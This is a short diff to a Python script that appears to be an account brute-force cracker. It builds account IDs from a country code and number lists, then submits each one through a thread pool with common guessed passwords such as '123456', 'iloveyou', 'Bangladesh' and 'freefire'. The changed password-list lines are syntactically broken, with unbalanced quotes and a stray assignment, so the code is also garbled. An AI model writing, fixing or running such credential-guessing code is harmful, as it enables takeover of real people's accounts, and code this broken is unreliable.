@@ -365,7 +365,7 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [pwx = [first+last, first+'123', first+'1234', first+'12345', 'Bangladesh', 'bangladesh', 'i love you', 'iloveyou', 'free fire', 'freefire']
+                                passlist = [psx,ids,'123456','first+last, first+'123', first+'1234','first+'12345', 'Bangladesh', 'bangladesh', 'i love you', 'iloveyou', 'free fire', 'freefire']
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
